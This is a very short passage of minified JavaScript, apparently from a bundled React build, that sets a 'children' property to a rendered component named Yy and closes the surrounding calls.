    children: i.jsx(Yy, {})
}));
